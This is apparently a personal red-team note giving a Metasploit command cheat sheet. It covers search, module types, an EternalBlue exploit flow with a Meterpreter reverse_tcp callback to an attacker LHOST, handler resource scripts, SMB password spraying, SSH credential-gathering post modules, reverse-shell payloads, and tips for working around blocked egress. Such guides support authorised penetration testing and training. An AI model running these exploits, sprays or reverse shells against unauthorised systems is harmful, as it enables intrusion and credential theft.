---
tags:
  - redteam
  - metasploit
  - exploitation
  - tooling
created: 2026-08-29
status: complete
---

# 🦊 Metasploit Framework Guide

> [!abstract] TL;DR
> msfconsole = exploit library + payload delivery + post-exploitation.
> Core flow: `search` → `use` → `show options` → `set` → `run`.

---

## 1. Console Basics

```bash
msfconsole -q                    # quiet banner
msfconsole -q -x "use exploit/multi/handler; set LHOST 10.10.14.5; run -j"
msfupdate                        # update modules (kali package: apt update metasploit-framework)

help                             # command reference
history
banner                           # yeet
```

```text
search type:exploit platform:windows rank:excellent smb
search cve:2021-44228
search name:eternalblue
info <module>                    # details, references, targets
back                             # exit current module context
```

> [!tip] Search filters
> `type:` exploit/auxiliary/payload/post/evasion/nop · `platform:` · `rank:`
> `cve:` · `name:` · `author:` · `app:client/server` · `path:`

---

## 2. Module Types

| Type | Purpose | Examples |
|---|---|---|
| `exploit/` | gains code exec / access | `exploit/windows/smb/ms17_010_eternalblue` |
| `auxiliary/` | scanners, fuzzers, brute force | `auxiliary/scanner/ssh/ssh_login` |
| `post/` | post-exploitation | `post/multi/recon/local_exploit_suggester` |
| `payload/` | shells & agents | singles, stagers, stages |
| `encoders/` | bad-char avoidance | see [[AV Evasion]] — not for real evasion |
| `nop/` | sled generators | `x86/opty2` |
| `evasion/` | basic AV-dodge artifacts | limited usefulness |

---

## 3. Standard Exploit Flow

```bash
use exploit/windows/smb/ms17_010_eternalblue
show options                     # required vs optional
set RHOSTS 10.10.20.10           # RHOSTS accepts CIDR, ranges, files (-)
set RPORT 445
show targets                     # pick matching OS/sp level
set TARGET 0
show payloads                    # compatible payloads for this exploit
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 443
check                            # some exploits support safe check
run / exploit -j                 # -j = background as job
```

---

## 4. Resource Scripts (Automation)

```bash
# save as handler.rc
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
exploit -j
```

```bash
msfconsole -q -r handler.rc      # load on startup
resource handler.rc              # load inside console
# Kali ships examples: /usr/share/metasploit-framework/scripts/resource/
```

---

## 5. Databases & Workspaces

```bash
service postgresql start && msfdb init   # one-time setup
db_status
workspace -a pentest-acme                # add/switch workspaces
db_nmap -sV -p- 10.10.20.0/24            # nmap, results stored in DB
hosts                                    # discovered hosts
services -p 445                          # filter by port
vulns                                    # found vulns
notes -t host
loot                                     # collected files
```

> [!tip] DB-driven scanning
> `services -R` pushes matching hosts into the current module's RHOSTS —
> e.g. `services -p 445 -R` while an SMB module is loaded, then `run`.

---

## 6. Auxiliary Scanners (Daily Drivers)

```bash
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_login            # password spray (set USER_FILE/PASS_FILE)
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/dir_scanner         # dirbust
use auxiliary/scanner/discovery/udp_sweep
use auxiliary/gather/enum_dns
```

---

## 7. Post Modules

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

use post/multi/manage/shell_to_meterpreter   # upgrade plain shell
use post/windows/gather/enum_shares
use post/multi/gather/ssh_creds
use post/linux/gather/enum_configs
```

---

## 8. Meterpreter-less Payloads (plain handlers)

```bash
# for msfvenom -p windows/shell_reverse_tcp etc.
set PAYLOAD cmd/unix/reverse_bash
set PAYLOAD generic/shell_reverse_tcp
# catch with nc instead if you don't need MSF features
```

---

## 9. Troubleshooting

> [!warning] Common fails
> - **No session:** wrong LHOST (must be your VPN/tun IP, not 127.0.0.1), firewall on LPORT, wrong payload arch
> - **Session opens then dies:** exploit crashed target → use compatible TARGET id, or auto-migrate script
> - **`check` unsupported:** verify manually against the service version
> - **Egress blocked:** switch to `reverse_https` LPORT 443, or `bind_tcp`

Related: [[Meterpreter]] · [[msfvenom — Payload Generation Guide]] · [[Nmap Guide]] · [[AV Evasion]]